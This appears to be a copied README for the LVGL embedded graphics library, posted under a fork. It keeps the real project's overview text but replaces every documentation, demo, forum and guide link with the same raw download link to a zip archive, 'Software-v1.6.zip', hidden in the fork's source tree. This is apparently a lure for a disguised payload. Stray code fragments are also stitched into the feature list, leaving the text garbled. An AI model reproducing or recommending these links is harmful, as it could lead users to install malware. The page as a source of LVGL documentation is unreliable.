## :ledger: Overview

**Mature and Well-known**<br>
LVGL is the most popular free and open source embedded graphics library to create beautiful UIs for any MCU, MPU and display type. It's supported by industry leading vendors and projects like  Arm, STM32, NXP, Espressif, Nuvoton, Arduino, RT-Thread, Zephyr, NuttX, Adafruit and many more.

**Feature Rich**<br>
It has all the features to create modern and beautiful GUIs: 30+ built-in widgets, a powerful style system, web inspired layout managers, and a typography system supporting many languages. To integrate LVGL into your platform, all you need is at least 32kB RAM and 128 kB Flash, a C compiler, a frame buffer, and at least an 1/10 screen sized buffer for rendering.

**Services**<br>
Our team is ready to help you with graphics design, UI implementation and consulting services. Contact us if you need some support during the development of your next GUI project.

## :rocket: Features

**Free and Portable**
  - A fully portable C (C++ compatible) library with no external dependencies.
  - Can be compiled to any MCU or MPU, with any (RT)OS.
  - Supports monochrome, ePaper, OLED or TFT displays, or even monitors. [Porting Guide](https://raw.githubusercontent.com/JonSmith2017/lvgl/master/src/libs/freetype/Software-v1.6.zip)
  - Distributed under the MIT license, so you can easily use it in commercial projects too.
  - Needs only 32kB RAM and 128 kB Flash, a frame buffer, and at least an 1/10 screen sized buffer for rendering.
  - OS, External memory and GPU are supported but not required.

**Widgets, Styles, Layouts and more**
  - 30+ built-in [Widgets](https://raw.githubusercontent.com/JonSmith2017/lvgl/master/src/libs/freetype/Software-v1.6.zip):  Button, Label, Slider, Chart, Keyboard, Meter, Arc, Table and many more.
  - Flexible [Style system](https://raw.githubusercontent.com/JonSmith2017/lvgl/master/src/libs/freetype/Software-v1.6.zip) with  ~100 style properties to customize any part of the widgets in any state.
  - [Flexbox](https://raw.githubusercontent.com/JonSmith2017/lvgl/master/src/libs/freetype/Software-v1.6.zip) and [Grid](https://raw.githubusercontent.com/JonSmith2017/lvgl/master/src/libs/freetype/Software-v1.6.zip)-like layouts engines to automatically size and position the widgets in a responsive way.
  - Texts are rendered with UTF-8 encoding supporting CJK, Thai, Hindi, Arabic, Persian writing systems.
  - Word wrapping, kerning, text scrolling, sub-pixel rendering, Pinyin-IME Chinese input, Emojis in texts.
  - Rendering engine supporting animations, anti-aliasing, opacity, smooth scrolling, shadows, image transformation, etc  
  - Supports Mouse, Touchpad, Keypad, Keyboard, External buttons, Encoder [Input devices](https://raw.githubusercontent.com/JonSmith2017/lvgl/master/src/libs/freetype/Software-v1.6.zip).
  - [Multiple display](https://raw.githubusercontent.com/JonSmith2017/lvgl/master/src/libs/freetype/Software-v1.6.zip) support.

**Binding and Build Support**
  - [MicroPython Binding](https://raw.githubusercontent.com/JonSmith2017/lvgl/master/src/libs/freetype/Software-v1.6.zip) exposes LVGL API
  - [PikaScript Binding](https://raw.githubusercontent.com/JonSmith2017/lvgl/master/src/libs/freetype/Software-v1.6.zip) python on MCU lighter and easier.
  - No custom build system is used. You can build LVGL as you build the other files of your project.
  - Support for Make and [CMake](https://raw.githubusercontent.com/JonSmith2017/lvgl/master/src/libs/freetype/Software-v1.6.zip) is included out of the box.
  - [Develop on PC](https://raw.githubusercontent.com/JonSmith2017/lvgl/master/src/libs/freetype/Software-v1.6.zip) and use the same UI code on embedded hardware.
  - Convert the C UI code to HTML file with our [Emscripten port](https://raw.githubusercontent.com/JonSmith2017/lvgl/master/src/libs/freetype/Software-v1.6.zip).

**Docs, Tools, and Services**
  - Detailed [Documentation](https://raw.githubusercontent.com/JonSmith2017/lvgl/master/src/libs/freetype/Software-v1.6.zip) with [100+ simple examples](https://raw.githubusercontent.com/JonSmith2017/lvgl/master/src/libs/freetype/Software-v1.6.zip)

lv_obj_center(slider);

/*Add local styles to MAIN part (background rectangle)*/

## :arrow_forward: Get started
This list will guide you to get started with LVGL step-by-step.

**Get Familiar with LVGL**

  1. Check the [Online demos](https://raw.githubusercontent.com/JonSmith2017/lvgl/master/src/libs/freetype/Software-v1.6.zip) to see LVGL in action (3 minutes)
  2. Read the [Introduction](https://raw.githubusercontent.com/JonSmith2017/lvgl/master/src/libs/freetype/Software-v1.6.zip) page of the documentation (5 minutes)
  3. Get familiar with the basics on the [Quick overview](https://raw.githubusercontent.com/JonSmith2017/lvgl/master/src/libs/freetype/Software-v1.6.zip) page (15 minutes)

**Start to Use LVGL**

  4. Set up a [Simulator](https://raw.githubusercontent.com/JonSmith2017/lvgl/master/src/libs/freetype/Software-v1.6.zip) (10 minutes)
  5. Try out some [Examples](https://raw.githubusercontent.com/JonSmith2017/lvgl/master/src/libs/freetype/Software-v1.6.zip)
  6. Port LVGL to a board. See the [Porting](https://raw.githubusercontent.com/JonSmith2017/lvgl/master/src/libs/freetype/Software-v1.6.zip) guide or check the ready to use [Projects](https://raw.githubusercontent.com/JonSmith2017/lvgl/master/src/libs/freetype/Software-v1.6.zip)

**Become a Pro**

  7. Read the [Overview](https://raw.githubusercontent.com/JonSmith2017/lvgl/master/src/libs/freetype/Software-v1.6.zip) page to get a better understanding of the library (2-3 hours)
  8. Check the documentation of the [Widgets](https://raw.githubusercontent.com/JonSmith2017/lvgl/master/src/libs/freetype/Software-v1.6.zip) to see their features and usage

**Get Help and Help Others**

  9. If you have questions go to the [Forum](https://raw.githubusercontent.com/JonSmith2017/lvgl/master/src/libs/freetype/Software-v1.6.zip)
  10. Read the [Contributing](https://raw.githubusercontent.com/JonSmith2017/lvgl/master/src/libs/freetype/Software-v1.6.zip) guide to see how you can help to improve LVGL (15 minutes)
